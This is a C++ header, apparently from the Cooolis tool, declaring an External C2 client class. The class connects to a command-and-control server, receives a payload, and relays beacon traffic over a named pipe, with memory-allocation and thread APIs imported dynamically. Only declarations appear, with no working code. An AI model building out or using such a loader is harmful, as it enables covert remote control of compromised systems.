#pragma once
#include <Winsock2.h>
#include <Windows.h>
#include <iostream>
#include "Kernel32-Import.h"
#include "Cooolis-String.h"

#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024
extern ImportCreateThread CooolisCreateThread;
extern ImportVirtualProtect CooolisVirtualProtect;
extern ImportVirtualProtectEx CooolisVirtualProtectEx;
extern ImportVirtualAlloc CooolisVirtualAlloc;

class CCooolisExternalC2 {

private:
	DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max);
	void write_frame(HANDLE my_handle, char* buffer, DWORD length);
	virtual DWORD recv_frame(SOCKET my_socket, char* buffer, DWORD max);
	virtual void send_frame(SOCKET my_socket, char* buffer, int length);
	std::string GetPipeName();
	SOCKET socket_extc2 = NULL;
	char* payload = NULL;
	HANDLE hBeacon = INVALID_HANDLE_VALUE;
	std::string sPipeName;
public:
	CCooolisExternalC2();
	~CCooolisExternalC2();
	BOOL ConnectServer(std::string host, USHORT port);
	BOOL SendOptions();
	BOOL RecvPayload();
	VOID HandleBeacon();

};